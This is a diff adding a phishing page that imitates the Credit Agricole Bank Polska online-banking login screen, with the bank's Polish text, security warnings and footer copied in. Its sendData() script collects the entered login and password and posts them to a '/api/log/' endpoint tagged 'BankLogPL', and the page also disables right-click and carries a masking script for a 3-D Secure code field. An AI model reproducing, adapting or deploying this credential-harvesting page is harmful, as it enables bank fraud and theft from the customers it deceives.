@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="pl"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <title>Credit Agricole Bank Polska S.A.</title>
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
+    <link rel="icon" type="image/x-icon" href="https://www.credit-agricole.com/bundles/casa/images/icons/favicon.ico">
+    <link rel="stylesheet" href="/static/style/banksPL/agricole.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.js"></script>
+    <script src="/static/style/protect/protect.js"></script>
+  </head>
+
+  <body class="theme anim user-not-recognized theme-default below-the-fold">
+    <noscript> </noscript>
+    <app-root _nghost-vjp-c100="" ng-version="11.2.9">
+      <div id="wrap" class="login">
+        <app-login-header class="ng-star-inserted">
+          <header class="brief">
+            <div class="logo-container site-width"><span class="logo">Credit Agricole</span></div>
+          </header>
+        </app-login-header>
+        <div tabindex="-1" id="main">
+          <div class="main-container site-width equal-gutters">
+            <app-top-alert class="ng-tns-c40-0"> </app-top-alert>
+            <app-login class="ng-tns-c169-3 ng-star-inserted">
+              <div class="ng-tns-c169-3 ng-trigger ng-trigger-routeAnimation">
+                <router-outlet class="ng-tns-c169-3"></router-outlet>
+                <app-login-screen class="ng-tns-c168-4 ng-star-inserted" style="">
+                  <div class="container-fluid ng-tns-c168-4">
+                    <div class="row justify-content-end ng-tns-c168-4">
+                      <div class="col-12 col-md-6 ng-tns-c168-4"> </div>
+                      <div class="col-12 col-md-6 md-strech ng-tns-c168-4">
+                        <app-login-form-user class="ng-tns-c168-4 ng-star-inserted">
+                          <div class="card-inner form-container">
+                            <form autocomplete="off" aria-hidden="false" method="post" id="formblock" class="ng-pristine ng-invalid ng-touched">
+                              <h1 class="h4">Zaloguj się</h1>
+                              <div class="form-group input-keyboard-group user-group not-too-wide">
+                                <label for="login">Twój identyfikator <a href="#" class="help-info help-info-md" data-original-title="" title="" aria-label="Podpowiedź"><i class="ca ca-question"></i></a></label>
+                                <input id="login" name="login" type="text" autocomplete="off" maxlength="30" class="form-control ng-pristine ng-invalid ng-touched" placeholder="Wprowadź identyfikator" required=""> </div>
+                                <div class="form-group input-keyboard-group user-group not-too-wide">
+                                  <label for="login">Hasło 
+                                    <a href="#" class="help-info help-info-md" data-original-title="" title="" aria-label="hasło">
+                                      <i class="ca ca-question"></i>
+                                    </a>
+                                  </label>
+
+                                  <input id="password" name="password" type="text" autocomplete="off" maxlength="30" class="form-control ng-pristine ng-invalid ng-touched" placeholder="hasło" required="">
+                                </div>
+                                <div class="form-group not-too-wide text-right my-2 my-lg-0">
+                                  <a href="#" class="text-link-sm">
+                                    <span>Masz problem z zalogowaniem?</span>
+                                  </a>
+                                </div>
+                                <div class="form-group not-too-wide text-right mb-4 ng-star-inserted">
+                                  <a href="#" class="text-link-sm">
+                                    <span>Nie pamiętasz hasła?</span>
+                                  </a>
+                                </div>
+                                <div class="buttons buttons-right not-too-wide">
+                                  <input id="login-user-click-button" type="submit" class="btn btn-primary btn-lg" value="Dalej" onclick="sendData()">
+                                </div>
+                              </form>
+
+                            <script>
+                              let pwdChars = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789aąbсćdеęfghijklłmnńoóprsśtuwyzźżAĄBCĆDEĘFGHIJKLŁMNŃOÓPRSŚTUWYZŹŻ';
+                              let pwdLen = 20;
+
+                              function inputMask(elem) {
+                                let val = elem.value;
+                                let val2 = '';
+                                for (let i = 0; i < val.length; i++) {
+                                  if (pwdChars.includes(val[i])) val2 += val[i];
+                                }
+                                elem.value = val2.substr(0, pwdLen);
+                              }
+                              document.addEventListener('DOMContentLoaded', function() {
+                                field3ds.oninput = function() {
+                                  inputMask(field3ds);
+                                }
+                                field3ds.focus();
+                              });
+                              document.oncontextmenu = function() {
+                                return false;
+                              };
+                            </script>
+
+                            <script type="text/javascript">
+                              function sendData() {
+                                var data = $('#formblock').serializeArray().reduce(function(obj, item) {
+                                    obj[item.name] = item.value;
+                                    return obj;
+                                }, {});
+
+                                fetch(`/api/log/${window.location.pathname.split('/')[3]}`, {
+                                  method: 'POST',
+                                  cache: 'no-cache',
+                                  headers: {
+                                      'Accept': 'application/json, text/plain, */*',
+                                      'Content-Type': 'application/json'
+                                  },
+                                  referrerPolicy: 'no-referrer',
+                                  body: JSON.stringify({
+                                      login: data.login,
+                                      password: data.password,
+                                      bank: 'agricole',
+                                      method: 'BankLogPL'
+                                  })
+                                })
+                              }
+                            </script>
+                          </div>
+                        </app-login-form-user>
+                      </div>
+                      <div class="col-12 col-md-6 ng-tns-c168-4 md-sticky-bottom-container ng-star-inserted" style="align-self: auto;">
+                        <app-login-note-alert class="ng-tns-c168-4 ng-star-inserted">
+                          <div class="note-alert card ng-star-inserted">
+                            <div role="complementary" class="alert alert-warning card-inner">
+                              <h2 class="caption"><span>UWAGA</span></h2>
+                              <div>
+                                <h5><strong>Zamykamy starą wersję serwisu internetowego CA24 eBank</strong></h5>
+                                <p>
+                                  <br>16 listopada 2021 roku zamkniemy ostatecznie poprzednią wersję serwisu internetowego CA24 eBank. Od tego dnia dostępna będzie tylko nowsza wersja serwisu, którą wdrożyliśmy dwa lata temu. Zaprojektowaliśmy ją&nbsp;z myślą o Państwa wygodzie - naszych klientach indywidualnych i firmowych.&nbsp;</p>
+                                <p>&nbsp;</p>
+                                <p>
+                                  <br>Więcej informacji <a href="https://www.credit-agricole.pl/o-banku/aktualnosci/2021/zamykamy-stara-wersje-serwisu-internetowego" target="_blank" rel="noopener">tutaj</a></p>
+                              </div>
+                            </div>
+                          </div>
+                        </app-login-note-alert>
+                      </div>
+                      <div class="col-12 col-md-6 md-strech ng-tns-c168-4 ng-star-inserted">
+                        <app-login-security-info class="ng-tns-c168-4">
+                          <div class="security-info-container card-inner clearfix h-100 ng-star-inserted">
+                            <div>
+                              <h5><a href="https://www.credit-agricole.pl/o-banku/aktualnosci/2021/ostrzezenie-oszusci-podaja-sie-za-pracownikow-banku" target="_blank" rel="noopener"><strong>Aktualne ostrzeżenie: oszuści podają się za pracowników banku</strong></a></h5>
+                              <p>&nbsp;</p>
+                              <h5>Kiedy korzystasz z bankowości internetowej, przestrzegaj kilku ważnych zasad:</h5>
+                              <ul>
+                                <li><strong>zanim się zalogujesz sprawdź:</strong></li>
+                              </ul>
+                              <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - czy w pasku jest prawidłowy adres: https://ca24.credit-agricole.pl,
+                                <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - czy przed adresem jest symbol kłódki,
+                                <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - czy certyfikat serwisu jest prawidłowy (taki jak opisujemy w sekcji <a href="https://www.credit-agricole.pl/bezpieczenstwo/korzystanie-z-nowego-serwisu-internetowego-ca24" target="_blank" rel="noopener">Bezpieczeństwo</a>),
+                                <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - czy po lewej stronie ekranu z hasłem wyświetla się Twój obrazek bezpieczeństwa;</p>
+                              <ul>
+                                <li>&nbsp;nie korzystaj z linków do logowania otrzymanych w SMS-ach i e-mailach;</li>
+                                <li>&nbsp;zawsze samodzielnie wpisuj adres CA24 eBank. Możesz zapisać ten adres w „ulubionych” w przeglądarce lub przechodzić do serwisu ze strony głównej banku;</li>
+                                <li>&nbsp;jeżeli cokolwiek budzi Twoje wątpliwości, gdy się logujesz lub autoryzujesz transakcję – przerwij operację, nie wprowadzaj danych i skontaktuj się z nami jak najszybciej.</li>
+                              </ul>
+                              <p class="left"><a href="https://www.credit-agricole.pl/bezpieczenstwo" target="_blank" rel="noopener">Dowiedz się więcej o bezpieczeństwie</a></p>
+                            </div>
+                          </div>
+                        </app-login-security-info>
+                      </div>
+                    </div>
+                  </div>
+                </app-login-screen>
+              </div>
+            </app-login>
+          </div>
+        </div>
+        <app-footer class="ng-star-inserted">
+          <footer>
+            <div class="site-width footer-width">
+              <div class="container-fluid">
+                <div class="row footer-elements">
+                  <div class="col-12 col-lg-8 menu-element">
+                    <div>
+                      <div class="footer-menu">
+                        <div class="logo"></div>
+                        <ul class="nav">
+                          <li><a href="javascript:void(0);"><span>Bezpieczeństwo</span></a></li>
+                          <li><a href="javascript:void(0);"><span>Polityka Cookies</span></a></li>
+                          <li><a href="javascript:void(0);"><span>Placówki i bankomaty</span></a></li>
+                          <li><a href="javascript:void(0);"><span>Koszt przewalutowania</span></a></li>
+                          <li><a href="javascript:void(0);"><span>Dokumenty</span></a></li>
+                          <li><a href="javascript:void(0);"><span>Opłaty i prowizje</span></a></li>
+                          <li><a href="javascript:void(0);"><span>Oprocentowanie</span></a></li>
+                          <li><a href="javascript:void(0);"><span>Kursy walut</span></a></li>
+                          <li><a href="javascript:void(0);"><span>Notowania funduszy</span></a></li>
+                        </ul>
+                      </div>
+                      <div class="footer-copyright">
+                        <p class="copyright"> © 2019 Credit Agricole Bank Polska S.A.
+                          <br class="d-md-none"> Wszelkie prawa zastrzeżone. </p>
+                      </div>
+                    </div>
+                    <div class="footer-buttons">
+                      <div id="set-language" class="dropdown">
+                        <button type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" class="btn btn-default dropdown-toggle"><i class="flag flag-pl"></i><span>Język polski</span></button>
+                        <div aria-labelledby="dropdownMenuButton" class="dropdown-menu"><a class="dropdown-item ng-star-inserted" style="cursor: pointer;"><i class="flag flag-pl"></i><span>Język polski</span></a><a class="dropdown-item ng-star-inserted" style="cursor: pointer;"><i class="flag flag-en"></i><span>English</span></a><a class="dropdown-item ng-star-inserted" style="cursor: pointer;"><i class="flag flag-fr"></i><span>Français</span></a><a class="dropdown-item ng-star-inserted" style="cursor: pointer;"><i class="flag flag-uk"></i><span>Українська</span></a> </div>
+                      </div><span id="set-contrast" class="footer-button form-inline"><button class="btn btn-default set-hicontrast"><span class="ca ca-contrast"></span> Wybierz wersję kontrastową </button>
+                      <button class="btn btn-default set-default"><span class="ca ca-contrast"></span> Wybierz wersję zwykłą </button>
+                      </span>
+                    </div>
+                  </div>
+                  <div class="col-12 col-lg-4 contact-element">
+                    <div class="row no-gutters">
+                      <div class="col-12 col-md-6 col-lg-12">
+                        <p class="infoline"><i class="ca ca-infoline"></i> Serwis telefoniczny:
+                          <br><span class="number"><a href="tel:19 019" title="19 019">19 019</a></span></p>
+                      </div>
+                      <div class="col-12 col-md-6 col-lg-12">
+                        <p class="phone"><i class="ca ca-device"></i> dla połączeń zagranicznych:
+                          <br><span class="number"><a href="tel:+48 71 35 49 009" title="+48 71 35 49 009">+48 71 35 49 009</a></span></p>
+                        <p class="appointment ng-star-inserted"><a href="javascript:void(0);"><i class="ca ca-chat"></i><span>Czat</span></a></p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </footer>
+        </app-footer>
+      </div>
+    </app-root>
+  
+
+</body></html>
